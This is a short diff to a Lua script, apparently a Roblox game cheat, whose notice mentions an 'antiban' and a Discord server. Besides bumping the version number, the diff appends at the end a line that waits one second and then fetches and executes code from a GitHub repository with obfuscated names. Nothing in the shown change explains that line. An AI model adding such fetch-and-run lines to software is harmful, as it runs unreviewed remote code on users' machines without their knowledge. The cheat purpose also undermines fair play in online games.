@@ -331,7 +331,7 @@ Title = "Script Status: Online",
 --Text = "Last Update 24/05/2024 - (brazil) - script Version: 0.2.9 - antiban = Dont talk on chat and no ban :D",
 --Text = "Script Remake: Config Script, Powerups, Ect...",
 Duration = 5,
-Text = "Last Update 25/08/2024 Script - (brazil) - script Version: 0.3.1 Remake: Config Script, Powerups, Ect...",
+Text = "Last Update 19/10/2024 Script - (brazil) - script Version: 0.3.2 Remake: Config Script, Powerups, Ect...",
 })
 end)
 
@@ -909,3 +909,5 @@ Duration = 10,
 Text = "Status: Online (Backup) .gg/dPb8GzFnGZ",
 })
    end
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/fdthjtj53ou-35huo356-35ug5353g634g6/refs/heads/main/ighh25n286tfn24685f24"))()
